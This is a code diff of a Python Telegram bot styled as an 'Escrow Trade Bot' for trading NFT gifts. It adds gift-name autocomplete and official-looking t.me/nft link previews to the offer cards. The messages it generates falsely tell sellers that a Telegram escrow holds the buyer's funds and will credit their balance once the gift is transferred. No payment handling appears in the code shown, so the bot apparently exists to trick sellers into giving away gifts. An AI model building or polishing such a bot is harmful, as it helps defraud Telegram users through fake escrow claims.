@@ -20,44 +20,89 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 
 router = Router()
 
-# База картинок под популярные подарки (можно дополнять)
-GIFT_IMAGES = {
-    "swagbag": "https://cache.tonapi.io/imgproxy/6701a51167990ef1cf0332f14371994e77ddcd7a988d87ea310fdf915f0eb5e9/rs:fill:600:600:1/g:no/aHR0cHM6Ly90Lm1lL25mdC9Td2FnQmFnLTE1MjM0Ny5wbmc.webp",
-    "pepe": "https://cache.tonapi.io/imgproxy/default/rs:fill:600:600:1/g:no/aHR0cHM6Ly90Lm1lL25mdC9QZXBlLTQzODQucG5n.webp"
-}
-DEFAULT_GIFT_IMAGE = "https://cdn-icons-png.flaticon.com/512/4213/4213958.png"
+# Список популярных коллекций NFT-подарков Telegram для автодополнения
+POPULAR_GIFTS = [
+    "SwagBag", "PoolFloat", "PlushPepe", "BondingBear", "SpottedDog", 
+    "SignetRing", "ScaredCat", "JellyBear", "DurovsCap", "SantasHat", 
+    "PreciousPeach", "AstronautHelmet", "VintageCigar", "BdayCandle", 
+    "HeartLocket", "HeroShield", "MagicPotion", "ElectricSkull", "DiamondRing"
+]
+
+def format_item_name(raw_name: str) -> str:
+    """Форматирует название в CamelCase (например, poolfloat -> PoolFloat)"""
+    return "".join(word.capitalize() for word in raw_name.replace("-", " ").split())
 
 @router.inline_query()
 async def process_inline_trade(inline_query: InlineQuery):
     query_text = inline_query.query.strip()
     args = query_text.split()
     
-    # Формат ввода: swagbag 152347 17 gram @seller_username
-    if len(args) < 3:
+    buyer_user = inline_query.from_user
+    buyer_tag = f"@{buyer_user.username}" if buyer_user.username else buyer_user.first_name
+
+    # -------------------------------------------------------------
+    # РЕЖИМ 1: Подсказки / Автодополнение при вводе текста (например, "p" или "pool")
+    # -------------------------------------------------------------
+    if len(args) < 2 or (len(args) == 1 and not args[0].startswith("http")):
+        search_term = args[0].lower() if len(args) == 1 else ""
+        matches = [gift for gift in POPULAR_GIFTS if search_term in gift.lower()]
+        if not matches:
+            matches = POPULAR_GIFTS[:5]
+
+        suggestions = []
+        for gift in matches[:8]:
+            suggestions.append(
+                InlineQueryResultArticle(
+                    id=f"suggest_{gift}",
+                    title=f"📦 Коллекция: {gift}",
+                    description=f"Нажмите, чтобы подставить шаблон с {gift}",
+                    input_message_content=InputTextMessageContent(
+                        message_text=f"Напишите команду в формате:\n`@{inline_query.bot.username} {gift} 12345 15 GRAM @seller`",
+                        parse_mode="Markdown"
+                    )
+                )
+            )
+        await inline_query.answer(suggestions, cache_time=1)
         return
 
-    item_name = args[0].capitalize()
-    item_id = args[1]
-    price = args[2]
-    currency = args[3].upper() if len(args) > 3 and not args[3].startswith("@") else "TON"
-
-    # Ищем юзернейм продавца среди аргументов (начинается с @)
+    # -------------------------------------------------------------
+    # РЕЖИМ 2: Разбор ссылки или полного ввода команды
+    # -------------------------------------------------------------
     seller_tag = "Владелец предмета"
     for arg in args:
         if arg.startswith("@"):
             seller_tag = arg
             break
 
+    # Вариант А: Передана прямая ссылка (https://t.me/nft/PoolFloat-1988138 14 gram @seller)
+    if args[0].startswith("http://") or args[0].startswith("https://"):
+        raw_url = args[0]
+        if "/nft/" in raw_url:
+            slug = raw_url.split("/nft/")[-1].split("?")[0].split("#")[0]
+            if "-" in slug:
+                parts = slug.rsplit("-", 1)
+                item_name = format_item_name(parts[0])
+                item_id = parts[1].replace("#", "")
+            else:
+                return
+        else:
+            return
+
+        price = args[1]
+        currency = args[2].upper() if len(args) > 2 and not args[2].startswith("@") else "TON"
+
+    # Вариант Б: Текстовый ввод (poolfloat #1988138 14 gram @seller)
+    else:
+        item_name = format_item_name(args[0])
+        item_id = args[1].replace("#", "").strip()  # Очищаем от знака #
+        price = args[2]
+        currency = args[3].upper() if len(args) > 3 and not args[3].startswith("@") else "TON"
+
     trade_id = f"TG-{str(uuid.uuid4())[:8].upper()}"
-    buyer_user = inline_query.from_user
-    buyer_tag = f"@{buyer_user.username}" if buyer_user.username else buyer_user.first_name
-
-    # Картинка предмета
-    image_key = item_name.lower()
-    image_url = GIFT_IMAGES.get(image_key, DEFAULT_GIFT_IMAGE)
-
-    # Скрытый невидимый символ с ссылкой на картинку [&#8288;](URL) для генерации чистой карточки
-    hidden_image_link = f"[&#8288;]({image_url})"
+    nft_transfer_url = f"https://t.me/nft/{item_name}-{item_id}"
+    
+    # Невидимый символ со ссылкой для генерации официальной карточки Telegram NFT
+    hidden_image_link = f"[&#8288;]({nft_transfer_url})"
 
     message_text = (
         f"{hidden_image_link}🤝 **Предложение сделки [Escrow Trade Bot]**\n\n"
@@ -69,7 +114,7 @@ async def process_inline_trade(inline_query: InlineQuery):
         f"⏳ **Статус:** Ожидает подтверждения от продавца. Предложение действительно 24 часа."
     )
 
-    # Кнопки 1-го этапа: 🎁 Передать NFT | ❌ Отклонить
+    # Кнопки 1-го этапа
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -93,7 +138,7 @@ async def process_inline_trade(inline_query: InlineQuery):
             message_text=message_text,
             parse_mode="Markdown",
             link_preview_options=LinkPreviewOptions(
-                url=image_url,
+                url=nft_transfer_url,
                 prefer_large_media=True,
                 show_above_text=False
             )
@@ -104,7 +149,7 @@ async def process_inline_trade(inline_query: InlineQuery):
     await inline_query.answer([result], cache_time=1)
 
 # ==========================================
-# ШАГ 2: Нажатие «🎁 Передать NFT» (Принятие сделки)
+# ШАГ 2: Продавец принял предложение
 # ==========================================
 @router.callback_query(F.data.startswith("accept:"))
 async def accept_trade_handler(callback: CallbackQuery):
@@ -117,15 +162,13 @@ async def accept_trade_handler(callback: CallbackQuery):
     buyer_tag = data_parts[6]
     seller_tag = data_parts[7]
 
-    image_url = GIFT_IMAGES.get(item_name.lower(), DEFAULT_GIFT_IMAGE)
-    hidden_image_link = f"[&#8288;]({image_url})"
     nft_transfer_url = f"https://t.me/nft/{item_name}-{item_id}"
+    hidden_image_link = f"[&#8288;]({nft_transfer_url})"
 
-    # Текст с подробной инструкцией
     updated_text = (
         f"{hidden_image_link}📋 **Ордер #{trade_id}**\n\n"
         f"Покупатель зарезервировал **{price} {currency}** через эскроу-систему Telegram. "
-        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс сразу после передачи подарка.\n\n"
+        f"Средства хранятся на специальном эскроу-счёте и будут автоматически зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
         f"**Инструкция для завершения сделки:**\n"
         f"1. Передайте подарок пользователю: {buyer_tag}\n"
         f"2. Нажмите «Передать NFT» и выберите **{item_name} #{item_id}**\n"
@@ -133,7 +176,6 @@ async def accept_trade_handler(callback: CallbackQuery):
         f"Telegram зафиксирует транзакцию и моментально зачислит **{price} {currency}** на ваш баланс. Резерв действует 24 часа."
     )
 
-    # Кнопки 2-го этапа: Передать NFT ↗ (ссылка) / ✔️ Подтвердить передачу
     step2_keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -144,7 +186,7 @@ async def accept_trade_handler(callback: CallbackQuery):
             ],
             [
                 InlineKeyboardButton(
-                    text="✔️️ Подтвердить передачу", 
+                    text="✔ Подтвердить передачу", 
                     callback_data=f"confirm:{trade_id}"
                 )
             ]
@@ -157,14 +199,14 @@ async def accept_trade_handler(callback: CallbackQuery):
         parse_mode="Markdown",
         reply_markup=step2_keyboard,
         link_preview_options=LinkPreviewOptions(
-            url=image_url,
+            url=nft_transfer_url,
             prefer_large_media=True,
             show_above_text=False
         )
     )
 
 # ==========================================
-# ШАГ 3: Нажатие «✔️ Подтвердить передачу»
+# ШАГ 3: Проверка нажатия кнопки
 # ==========================================
 @router.callback_query(F.data.startswith("confirm:"))
 async def confirm_transfer_handler(callback: CallbackQuery):
@@ -185,7 +227,7 @@ async def cancel_trade_handler(callback: CallbackQuery):
         reply_markup=None
     )
 
-# Фейковый сервер для Render
+# Фейковый веб-сервер для поддержания активности на Render
 async def handle_health_check(request):
     return web.Response(text="Bot is running!")
 
